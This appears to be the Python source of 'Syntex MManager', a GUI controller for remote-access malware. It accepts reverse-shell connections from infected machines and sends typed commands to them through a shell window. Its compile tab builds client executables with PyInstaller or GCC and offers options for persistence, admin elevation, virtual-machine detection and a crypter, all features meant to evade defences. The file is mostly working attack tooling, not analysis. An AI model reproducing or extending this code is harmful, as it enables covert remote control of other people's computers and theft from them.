import time
import customtkinter as ck
import tkinter as tk
from tkinter import filedialog as fd
from tkinter import ttk
import socket as s
import os
import signal
import sys
import subprocess
import shutil
import threading
from uuid import uuid4

sys.path.append(os.path.dirname(os.path.abspath(__file__)))

APPARENCE = open('settings/apparence', mode='r').read()
COLOR_THEME = open('settings/color_theme', mode='r').read()
SOCKETS = {}
THREADS = {}
USERS = {}
CONNECTIONS = {}
MESSAGES = {}


def log_errors(exception):
    with open('logs/error.log', 'a') as file:
        file.write(str(exception) + '\n')


class FrameTabConnections(ck.CTkFrame):
    def __init__(self, master):
        super().__init__(master)

        self.grid_columnconfigure(0, weight=1)

        self.label_entry_type = ck.CTkLabel(self, text='Type')
        self.entry_type = ck.CTkOptionMenu(
            self,
            values=['reverse', 'normal']
        )

        self.label_entry_host = ck.CTkLabel(self, text='Host')
        self.entry_host = ck.CTkEntry(self)

        self.label_entry_port = ck.CTkLabel(self, text='Port')
        self.entry_port = ck.CTkEntry(self)

        self.label_entry_type.grid(column=0, row=0, padx=2, pady=10)
        self.entry_type.grid(column=1, row=0, padx=2, pady=10)
        self.label_entry_host.grid(column=2, row=0, padx=2, pady=10)
        self.entry_host.grid(column=3, row=0, padx=2, pady=10)
        self.label_entry_port.grid(column=4, row=0, padx=2, pady=10)
        self.entry_port.grid(column=5, row=0, padx=2, pady=10)


class FrameTabCompile(ck.CTkFrame):
    def __init__(self, master):
        super().__init__(master)

        self.grid_columnconfigure(0, weight=1)

        self.label_entry_autorun = ck.CTkLabel(self, text='Autorun')
        self.entry_autorun = ck.CTkOptionMenu(
            self,
            values=['False', 'True']
        )

        self.label_entry_activate = ck.CTkLabel(self, text='Activate')
        self.entry_activate = ck.CTkOptionMenu(
            self,
            values=['False', 'True']
        )

        self.label_entry_admin = ck.CTkLabel(self, text='Run in Admin')
        self.entry_admin = ck.CTkOptionMenu(
            self,
            values=['False', 'True']
        )

        self.label_entry_vm = ck.CTkLabel(self, text='Detect VM')
        self.entry_vm = ck.CTkOptionMenu(
            self,
            values=['False', 'True']
        )

        self.label_entry_compiler = ck.CTkLabel(self, text='Compiler')
        self.entry_compiler = ck.CTkOptionMenu(
            self,
            values=['PyInstaller', 'GCC']
        )

        self.label_entry_host = ck.CTkLabel(self, text='Host')
        self.entry_host = ck.CTkEntry(self)

        self.label_entry_port = ck.CTkLabel(self, text='Port')
        self.entry_port = ck.CTkEntry(self)

        self.label_entry_filename = ck.CTkLabel(self, text='Output Filename')
        self.entry_filename = ck.CTkEntry(self)

        self.label_entry_source_file = ck.CTkLabel(self, text='Source File')
        self.entry_source_file = ck.CTkEntry(self)

        self.label_entry_autorun.grid(column=0, row=0, padx=6, pady=10)
        self.entry_autorun.grid(column=1, row=0, padx=6, pady=10)
        self.label_entry_activate.grid(column=2, row=0, padx=6, pady=10)
        self.entry_activate.grid(column=3, row=0, padx=6, pady=10)
        self.label_entry_admin.grid(column=4, row=0, padx=6, pady=10)
        self.entry_admin.grid(column=5, row=0, padx=6, pady=10)

        self.label_entry_vm.grid(column=0, row=1, padx=6, pady=10)
        self.entry_vm.grid(column=1, row=1, padx=6, pady=10)
        self.label_entry_compiler.grid(column=2, row=1, padx=6, pady=10)
        self.entry_compiler.grid(column=3, row=1, padx=6, pady=10)

        self.label_entry_host.grid(column=0, row=2, padx=6, pady=10)
        self.entry_host.grid(column=1, row=2, padx=6, pady=10)
        self.label_entry_port.grid(column=2, row=2, padx=6, pady=10)
        self.entry_port.grid(column=3, row=2, padx=6, pady=10)
        self.label_entry_filename.grid(column=4, row=2, padx=6, pady=10)
        self.entry_filename.grid(column=5, row=2, padx=6, pady=10)

        self.label_entry_source_file.grid(column=0, row=3, padx=6, pady=10)
        self.entry_source_file.bind("<Button-1>", command=self.set_file)
        self.entry_source_file.grid(column=1, row=3, padx=6, pady=10)

    def set_file(self, _):
        source_file = fd.askopenfilename(initialdir='./source', title='Open File', filetypes=(("All Files", "*.*"),))
        if source_file:
            self.entry_source_file.delete(0, tk.END)
            filename = os.path.basename(os.fspath(source_file))
            self.entry_source_file.insert(0, filename)


class FrameButtonConnections(ck.CTkFrame):
    def __init__(self, master, func):
        super().__init__(master)

        self.grid_columnconfigure(0, weight=1)

        self.button_add_connection = ck.CTkButton(
            self,
            text='Add',
            command=func.add_connection
        )

        self.button_del_connection = ck.CTkButton(
            self,
            text='Del',
            command=func.del_connection
        )

        self.button_add_connection.grid(column=0, row=0, padx=2, pady=10)
        self.button_del_connection.grid(column=1, row=0, padx=2, pady=10)


class FrameButtonCompile(ck.CTkFrame):
    def __init__(self, master, func):
        super().__init__(master)
        self.grid_columnconfigure(0, weight=1)

        self.button_compile = ck.CTkButton(
            self, text='Compile', command=func.compiler
        )

        self.button_compile.grid(column=0, row=0, padx=2, pady=10)


class TopLevelWindowWarning(ck.CTkToplevel):
    def __init__(self, master, title, warnings, *args, **kwargs):
        super().__init__(*args, **kwargs)

        w = 400
        h = 200

        self.geometry("%dx%d" % (w, h))
        self.title(title)
        self.root = master

        self.frame_text = ck.CTkFrame(self)
        self.frame_text.pack(fill=tk.BOTH, expand=True)

        self.textbox = ck.CTkTextbox(self.frame_text)
        self.textbox.bind("<Tab>", self.tab)
        self.textbox.pack(fill=tk.BOTH, expand=True)

        self.insert_warning(warnings)

    def tab(self, _):
        self.textbox.insert(tk.INSERT, " " * 4)
        return "break"

    def insert_warning(self, warnings):
        for warning in warnings:
            self.textbox.insert(tk.END, warning)
            self.textbox.yview(tk.END)


class TopLevelWindowUserTerminal(ck.CTkToplevel):
    def __init__(self, master, user_record, *args, **kwargs):
        super().__init__(*args, **kwargs)
        w = 600
        h = 400

        self.geometry("%dx%d" % (w, h))
        self.title(f'User Terminal: {user_record}')
        self.user = USERS[user_record]
        self.id = user_record
        self.root_title = master.title_str
        self.root = master

        self.frame_text = ck.CTkFrame(self)
        self.frame_input = ck.CTkFrame(self)
        self.frame_input.grid_columnconfigure(1, weight=1)

        self.frame_text.pack(fill=tk.BOTH, expand=True)
        self.frame_input.pack(fill=tk.X, expand=False)

        self.textbox = ck.CTkTextbox(self.frame_text)
        self.textbox.bind("<Tab>", self.tab)
        self.textbox.pack(fill=tk.BOTH, expand=True)

        self.input_entry = ck.CTkEntry(self.frame_input)
        self.label_input_entry = ck.CTkLabel(self.frame_input, text=f'{self.root_title}$ ')

        self.label_input_entry.grid(column=0, row=0, padx=0, pady=0)
        self.input_entry.grid(column=1, row=0, padx=0, pady=0, sticky=tk.EW)
        self.input_entry.bind("<Return>", command=self.hendle_send)

        for message in MESSAGES[user_record]:
            self.textbox.insert(tk.END, message)
            self.textbox.yview(tk.END)

        self.my_menu = tk.Menu(self, tearoff=False)
        self.my_menu.add_command(label="Save on file", command=self.save_on_file)
        self.my_menu.add_command(label='Open history', command=self.open_history)
        self.my_menu.add_command(label="Clear", command=(lambda: self.textbox.delete(1.0, tk.END)))
        self.bind('<Button-3>', self.popup)

    def popup(self, event):
        self.my_menu.tk_popup(event.x_root, event.y_root)

    def tab(self, _):
        self.textbox.insert(tk.INSERT, " " * 4)
        return "break"

    def save_on_file(self):
        filename = fd.asksaveasfile(initialdir='./instances/shell_history', title='Save File', filetypes=(('Text Files', '*.txt'), ("All Files", "*.*")))
        if filename:
            filename.write(self.textbox.get(0.0, tk.END))
        self.lift()

    def open_history(self):
        global MESSAGES
        filename = fd.askopenfilename(initialdir='./instances/shell_history', title='Open File', filetypes=(('Text Files', '*.txt'), ("All Files", "*.*")))
        if filename:
            with open(filename, 'r') as file:
                file_content = file.read()
                self.textbox.insert(tk.END, file_content)
                self.textbox.yview(tk.END)
            if self.id in MESSAGES.keys() and MESSAGES[self.id] and isinstance(MESSAGES[self.id], list):
                MESSAGES[self.id].append(file_content)
            else:
                MESSAGES[self.id] = [file_content]
        self.lift()

    def hendle_send(self, event):
        if event.send_event:
            data = self.input_entry.get() + '\n'
            message = self.root_title + '$ ' + data
            MESSAGES[self.id].append(message)
            try:
                self.user.send(data.encode())
            except OSError:
                pass
            self.input_entry.delete(0, tk.END)
            self.textbox.insert(tk.END, message)
            self.textbox.yview(tk.END)


class Application(ck.CTk):
    global APPARENCE
    global COLOR_THEME
    ck.set_appearance_mode(APPARENCE)
    ck.set_default_color_theme(COLOR_THEME)

    working_dir = os.path.join(os.getcwd(), "source")
    dist_dir = os.path.join(working_dir, "dist")

    def __init__(self, title, *args, **kwargs):
        super().__init__(*args, **kwargs)

        # Setup
        w = 800
        h = 600
        x = (self.winfo_screenwidth() / 2) - (w / 2) + 100
        y = (self.winfo_screenheight() / 2) - (h / 2) - 30

        self.title_str = title
        self.title(self.title_str)
        self.iconbitmap(f'icons/{APPARENCE}-syntex.ico')
        self.geometry("%dx%d+%d+%d" % (w, h, x, y))
        self.grid_columnconfigure(0, weight=1)

        # Tabs
        self.tab_view = ck.CTkTabview(self)
        self.tab_view.pack(fill=ck.BOTH, expand=True)

        self.tab_settings = self.tab_view.add("Settings")
        self.tab_users = self.tab_view.add("Users")
        self.tab_connections = self.tab_view.add("Conections")
        self.tab_compile = self.tab_view.add("Compile")
        self.tab_crypter = self.tab_view.add("Crypter")

        # Tab Settings
        self.tab_view.label_apparence_mode = ck.CTkLabel(self.tab_settings, text=APPARENCE)
        self.tab_view.choice_apparence = ck.CTkSwitch(
            self.tab_settings, text="Apparence",
            onvalue="Light", offvalue="Dark",
            variable=ck.StringVar(value=APPARENCE),
            command=self.change_apparence
        )
        self.tab_view.label_apparence_mode.grid(column=0, row=0, padx=2)
        self.tab_view.choice_apparence.grid(column=1, row=0, padx=2)

        self.tab_view.label_color_theme = ck.CTkLabel(self.tab_settings, text=COLOR_THEME)
        self.tab_view.choise_color_theme = ck.CTkComboBox(
            self.tab_settings,
            values=['dark-blue', 'blue', 'green'],
            command=self.change_color_theme,
            variable=ck.StringVar(value=COLOR_THEME)
        )
        self.tab_view.label_need_restart = ck.CTkLabel(self.tab_settings, text="")

        self.tab_view.label_color_theme.grid(column=0, row=1, padx=2)
        self.tab_view.choise_color_theme.grid(column=1, row=1, padx=2, pady=10)
        self.tab_view.label_need_restart.grid(column=2, row=1, padx=2, pady=10)

        # Tab Users
        self.tab_view.label_users = ck.CTkLabel(self.tab_users, text="Users connected!")
        self.tab_view.label_users.pack()

        self.tab_view.list_users = ttk.Treeview(self.tab_users, columns=('id', 'ip', 'port', 'other'), show='headings')
        self.tab_view.list_users.heading('id', text='ID')
        self.tab_view.list_users.heading('ip', text='IP')
        self.tab_view.list_users.heading('port', text='PORT')
        self.tab_view.list_users.heading('other', text='OTHER')
        self.tab_view.list_users.pack(fill=ck.BOTH, expand=True)

        self.my_menu_user = tk.Menu(self.tab_view.list_users, tearoff=False)
        self.my_menu_user.add_command(label='Open Shell', command=self.open_toplevel_userterminal)
        self.tab_view.list_users.bind("<Button-3>", self.popup)

        # Tab Connections
        self.tab_view.frame_connection = FrameTabConnections(self.tab_connections)
        self.tab_view.frame_connection.pack(padx=2, pady=5)

        self.tab_view.frame_button_connection = FrameButtonConnections(self.tab_connections, func=self)
        self.tab_view.frame_button_connection.pack(padx=2, pady=10)

        self.tab_view.list_connections = ttk.Treeview(self.tab_connections, columns=('type', 'HOST', 'port'), show='headings')
        self.tab_view.list_connections.heading('type', text='TYPE')
        self.tab_view.list_connections.heading('HOST', text='HOST')
        self.tab_view.list_connections.heading('port', text='PORT')
        self.tab_view.list_connections.pack(padx=2, pady=10, fill=ck.BOTH, expand=True)

        self.load_connections()

        self.toplevel_user_terminal = None
        self.toplevel_warning = None

        # Tab Compile
        self.tab_view.frame_compile = FrameTabCompile(self.tab_compile)
        self.tab_view.frame_compile.pack(padx=2, pady=5)

        self.tab_view.frame_button_compile = FrameButtonCompile(self.tab_compile, func=self)
        self.tab_view.frame_button_compile.pack(padx=2, pady=10)

        self.tab_view.label_dist_folder = ck.CTkLabel(self.tab_compile, text=f'{self.dist_dir}')
        self.tab_view.label_dist_folder.pack(padx=2, pady=10)

        self.tab_view.dist_folder = ck.CTkTextbox(self.tab_compile)
        self.tab_view.dist_folder.pack(padx=2, pady=10, fill=ck.BOTH, expand=True)
        self.update_dist_folder()

    def __repr__(self):
        return f"App {self.title_str}"

    def change_apparence(self):
        global APPARENCE
        choice = self.tab_view.choice_apparence.get()
        with open('settings/apparence', 'w') as apparence_file:
            apparence_file.write(choice)
        self.tab_view.label_apparence_mode.configure(text=choice)
        self.iconbitmap(f'icons/{choice}-syntex.ico')
        ck.set_appearance_mode(choice)

    def change_color_theme(self, choice):
        global COLOR_THEME
        with open('settings/color_theme', 'w') as color_file:
            color_file.write(choice)
        if choice != COLOR_THEME:
            self.tab_view.label_need_restart.configure(text='NEED RESTART!')
        else:
            self.tab_view.label_need_restart.configure(text='')

    def load_connections(self):
        with open('settings/connections', 'r') as connections_file:
            connections = connections_file.read().splitlines()
            for connection in connections:
                e_type, e_host, e_port = connection.split('$')
                self.add_connection({'e_type': e_type, 'e_host': e_host, 'e_port': e_port})

    def open_toplevel_userterminal(self):
        user_record = self.tab_view.list_users.selection()
        if user_record:
            if self.toplevel_user_terminal is not None and self.toplevel_user_terminal.winfo_exists():
                self.toplevel_user_terminal.destroy()
            self.toplevel_user_terminal = TopLevelWindowUserTerminal(self, user_record[0])
        try:
            self.toplevel_user_terminal.after(50, self.toplevel_user_terminal.lift)
        except AttributeError:
            pass
        except Exception as e:
            log_errors(e)

    def open_toplevel_warnings(self, warnings: list):
        if self.toplevel_warning is not None and self.toplevel_warning.winfo_exists():
            self.toplevel_warning.destroy()
        self.toplevel_warning = TopLevelWindowWarning(self, "Compiler Status", warnings)

        try:
            self.toplevel_warning.after(50, self.toplevel_warning.lift)
        except AttributeError:
            pass
        except Exception as e:
            log_errors(e)

    def update_dist_folder(self):
        files = os.listdir(self.dist_dir)
        self.tab_view.dist_folder.delete(1.0, tk.END)
        for file in files:
            self.tab_view.dist_folder.insert(tk.END, file)
            self.tab_view.dist_folder.insert(tk.END, '\n')

    def popup(self, event):
        self.my_menu_user.tk_popup(event.x_root, event.y_root)

    def hendle_data_user(self, data: bytes, user_record):
        try:
            message = data.decode('utf-8')
        except UnicodeDecodeError:
            message = data.decode('cp850', 'replace')
        global MESSAGES
        if (
            self.toplevel_user_terminal is not None and
            self.toplevel_user_terminal.winfo_exists() and
            self.toplevel_user_terminal.id == user_record
        ):
            self.toplevel_user_terminal.textbox.insert(tk.END, message)
            self.toplevel_user_terminal.textbox.yview(tk.END)

        if user_record in MESSAGES.keys():
            MESSAGES[user_record].append(data)

    def del_connection(self):
        global THREADS, SOCKETS, CONNECTIONS
        selected = self.tab_view.list_connections.selection()
        for record in selected:
            self.tab_view.list_connections.delete(record)
            with open('settings/connections', 'r') as file:
                actual_connections = file.read()

            with open('settings/connections', 'w') as connections_file:
                new_connections = actual_connections.replace(f'{CONNECTIONS[record]}\n', '')
                connections_file.write(new_connections)
            try:
                self.del_user(record, SOCKETS[record])
                thread, event = THREADS[record]
                event.set()
                thread.join(0.1)
            except KeyError:
                continue
            THREADS.pop(record)
            SOCKETS.pop(record)
            CONNECTIONS.pop(record)

    def add_user(self, id_thread, client, addr):
        global USERS
        # try:
        #     client.send(b'Connected!\n')
        # except OSError:
        #     pass
        USERS[id_thread] = client
        if id_thread not in MESSAGES.keys():
            MESSAGES[id_thread] = []
        ip, port = addr
        info = f"connected on {client.getsockname()}"
        if id_thread not in self.tab_view.list_users.get_children():
            self.tab_view.list_users.insert('', ck.END, id=id_thread, values=(id_thread, ip, port, info))

    def del_user(self, id_thread, client):
        global USERS
        # try:
        #     client.send(b'Disconnected!\n')
        # except OSError:
        #     pass
        skt = USERS.pop(id_thread, None)
        try:
            client.close()
        except Exception as e:
            log_errors(e)

        try:
            skt.close()
        except Exception as e:
            log_errors(e)

        if id_thread in self.tab_view.list_users.get_children():
            self.tab_view.list_users.delete(id_thread)

        if (
            self.toplevel_user_terminal is not None and
            self.toplevel_user_terminal.winfo_exists() and
            self.toplevel_user_terminal.id == id_thread
        ):
            self.toplevel_user_terminal.destroy()

    def add_connection(self, load_connection: dict = None):
        global THREADS
        if load_connection is None:
            e_type = self.tab_view.frame_connection.entry_type.get()
            e_host = self.tab_view.frame_connection.entry_host.get()
            e_port = self.tab_view.frame_connection.entry_port.get()
        else:
            e_type = load_connection['e_type']
            e_host = load_connection['e_host']
            e_port = load_connection['e_port']
        self.tab_view.frame_connection.entry_host.delete(0, ck.END)
        self.tab_view.frame_connection.entry_port.delete(0, ck.END)

        try:
            int(e_port)
        except ValueError:
            return

        i_type = 1 if e_type == 'reverse' else 0
        i_host = "0.0.0.0" if not e_host else e_host
        i_port = int(e_port)

        # connection = (i_type, i_port, e_host)
        # CONNECTIONS.append(connection)
        def handle_t1(skt, id_t, evt):
            try:
                children = self.tab_view.list_connections.get_children()
            except RuntimeError:
                return
            while id_t in children and not evt.is_set():
                try:
                    c, a = skt.accept()
                except OSError as ee:
                    print(ee)
                    break

                self.add_user(id_t, c, a)
                while True and not evt.is_set():
                    try:
                        data = c.recv(1024)
                    except ConnectionResetError:
                        self.del_user(id_t, c)
                        break
                    except Exception as e:
                        print(e)
                        break
                    if data:
                        self.hendle_data_user(data, id_t)
                    else:
                        self.del_user(id_t, c)
                        break
            self.del_user(id_t, skt)

        def handle_t2(id_t, evt):
            try:
                children = self.tab_view.list_connections.get_children()
            except RuntimeError:
                return
            while id_t in children and not evt.is_set():
                skt = s.socket(s.AF_INET, s.SOCK_STREAM)
                SOCKETS[id_thread] = skt
                try:
                    skt.connect((i_host, i_port))
                except (OSError, OverflowError):
                    time.sleep(1)
                    pass
                else:
                    self.add_user(id_t, skt, (e_host, i_port))
                    while True and not evt.is_set():
                        try:
                            data = skt.recv(1024)
                            self.hendle_data_user(data, id_t)
                        except ConnectionResetError:
                            self.del_user(id_t, skt)
                            break
                        except Exception as e:
                            log_errors(e)
                            break
                self.del_user(id_t, skt)

        socket = s.socket(s.AF_INET, s.SOCK_STREAM)
        if i_type == 1:
            try:
                socket.bind((i_host, i_port))
                socket.listen(1)
            except (OSError, OverflowError):
                pass
            else:
                id_thread = str(uuid4())
                event = threading.Event()
                thread = threading.Thread(target=handle_t1, args=(socket, id_thread, event))
                thread.daemon = True
                thread.start()

                SOCKETS[id_thread] = socket
                THREADS[id_thread] = [thread, event]

                self.tab_view.list_connections.insert('', ck.END, id=id_thread, values=(e_type, e_host, e_port))
                with open('settings/connections', 'r') as file:
                    actual = file.read().splitlines()

                with open('settings/connections', 'a') as file:
                    if f'{e_type}${e_host}${e_port}' not in actual:
                        file.write(f'{e_type}${e_host}${e_port}\n')
                CONNECTIONS[id_thread] = f'{e_type}${e_host}${e_port}'
        elif i_type == 0 and i_host != "0.0.0.0":
            id_thread = str(uuid4())
            event = threading.Event()
            thread = threading.Thread(target=handle_t2, args=(id_thread, event))
            thread.daemon = True
            thread.start()

            THREADS[id_thread] = [thread, event]

            self.tab_view.list_connections.insert('', ck.END, id=id_thread, values=(e_type, e_host, e_port))
            with open('settings/connections', 'r') as file:
                actual = file.read().splitlines()

            with open('settings/connections', 'a') as file:
                if f'{e_type}${e_host}${e_port}' not in actual:
                    file.write(f'{e_type}${e_host}${e_port}\n')
            CONNECTIONS[id_thread] = f'{e_type}${e_host}${e_port}'

    def compiler(self):
        working_dir = os.path.join(os.getcwd(), "source")
        dist_dir = os.path.join(working_dir, "dist")

        compiler = self.tab_view.frame_compile.entry_compiler.get()

        host = self.tab_view.frame_compile.entry_host.get()
        port = self.tab_view.frame_compile.entry_port.get()
        source_file = self.tab_view.frame_compile.entry_source_file.get()
        filename = self.tab_view.frame_compile.entry_filename.get()
        autorun = self.tab_view.frame_compile.entry_autorun.get()
        activate = self.tab_view.frame_compile.entry_activate.get()
        admin = self.tab_view.frame_compile.entry_admin.get()
        detect = self.tab_view.frame_compile.entry_vm.get()

        if admin != "False" and admin != "True":
            admin = "False"

        warning = f"Inicialized with compiler: {compiler}. \non working dir: {working_dir}. \non dist dir: {dist_dir}. \n"

        self.open_toplevel_warnings([warning])

        if compiler == 'PyInstaller':
            writer = (
                f'HOST = "{host}"\n'
                f'PORT = {port or 555}\n'
                f'ACTIVATE = {activate or "False"}\n'
                f'PERSIST = {autorun or "False"}\n'
                f'ADMIN = {admin or "False"}\n'
                f'DETECT_VM = {detect or "False"}\n'
            )

            args = [
                "pyinstaller",
                "-w",
                "--clean",
                "--onefile",
                "-p", os.path.join(working_dir, 'config').replace('\\', '\\\\'),
                "--name", os.path.join(dist_dir, filename).replace('\\', '\\\\'),
                "--workpath", os.path.join(working_dir, 'build').replace('\\', '\\\\'),
                "--distpath", os.path.join(working_dir, 'dist').replace('\\', '\\\\'),
                os.path.join(working_dir, source_file).replace('\\', '\\\\')
            ]
            if eval(admin):
                args.insert(4, "--uac-admin")

            with open(f'{working_dir}\\config\\compiler_config.py', 'w') as config:
                config.write(writer)

        elif compiler == 'GCC':
            writer = (
                f'#define HOST "{host}"\n'
                f'#define PORT {port or 555}\n'
                f'#define ACTIVATE {activate.lower() or "False"}\n'
                f'#define PERSIST {autorun.lower() or "False"}\n'
                f'#define ADMIN {admin.lower() or "False"}\n'
                f'#define DETECT_VM {detect.lower() or "False"}\n'
            )
            args = ["gcc", os.path.join(working_dir, source_file), "-o", os.path.join(dist_dir, filename)]
            if eval(admin):
                for arg in [
                    ';', 'mt.exe', '-manifest', f'{working_dir}\\config\\manifest.xml',
                    f'-outputresource:{working_dir}\\dist\\{filename}.exe;1'
                ]:
                    args.append(arg)

            with open(f'{working_dir}\\config\\compiler_config.h', 'w') as config:
                config.write(writer)
        else:
            raise ValueError("Compiler not found.")

        if args and self.toplevel_warning is not None:
            self.run_subprocess(args, working_dir, dist_dir, filename)

        self.tab_view.frame_compile.entry_host.delete(0, tk.END)
        self.tab_view.frame_compile.entry_port.delete(0, tk.END)
        self.tab_view.frame_compile.entry_source_file.delete(0, tk.END)
        self.tab_view.frame_compile.entry_filename.delete(0, tk.END)

    def run_subprocess(self, args, working_dir, dist_dir, filename):
        def read_output(proc: subprocess.Popen):
            for line in iter(proc.stdout.readline, b''):
                self.toplevel_warning.insert_warning([line])
                if not line:
                    proc.stdout.close()
                    break

            proc.wait()
            try:
                shutil.rmtree(f"{working_dir}\\build")
                os.remove(os.path.join(dist_dir, f'{filename}.spec'))
            except FileNotFoundError:
                pass
            warning = f"REMOVED TREE: {working_dir}\\build. \nREMOVED: {os.path.join(dist_dir, f'{filename}.spec')}"
            self.toplevel_warning.after(50, self.toplevel_warning.insert_warning, [warning])
            self.toplevel_warning.after(50, self.update_dist_folder())

        process = subprocess.Popen(args, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, bufsize=1)
        thread = threading.Thread(target=read_output, args=(process,), daemon=True)
        thread.start()
        # thread.join()

        # time.sleep(1)
        # try:
        #     proc = subprocess.run(args, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        #     out, err = proc.communicate()
        #     pass
        # except Exception as e:
        #     print(e)
        # else:
        #     self.toplevel_warning.after(50, self.toplevel_warning.insert_warning, [out, err])
        #     try:
        #         shutil.rmtree(f"{working_dir}\\build")
        #         os.remove(os.path.join(dist_dir, f'{filename}.spec'))
        #     except FileNotFoundError:
        #         pass
        #     warning = f"REMOVED TREE: {working_dir}\\build. \nREMOVED: {os.path.join(dist_dir, f'{filename}.spec')}"
        #     self.toplevel_warning.after(50, self.toplevel_warning.insert_warning, [warning])


if __name__ == '__main__':
    app = Application("Syntex MManager")

    def on_close():
        global THREADS, SOCKETS, USERS
        for _, (thread, event) in THREADS.items():
            event.set()
            thread.join(0.5)
        for key, socket in SOCKETS.items():
            try:
                socket.close()
            except OSError:
                continue
        for key, client in USERS.items():
            try:
                client.close()
            except OSError:
                continue
        THREADS = {}
        SOCKETS = {}
        USERS = {}
        app.destroy()

    app.protocol("WM_DELETE_WINDOW", on_close)
    try:
        app.mainloop()
    except Exception as error:
        log_errors(error)
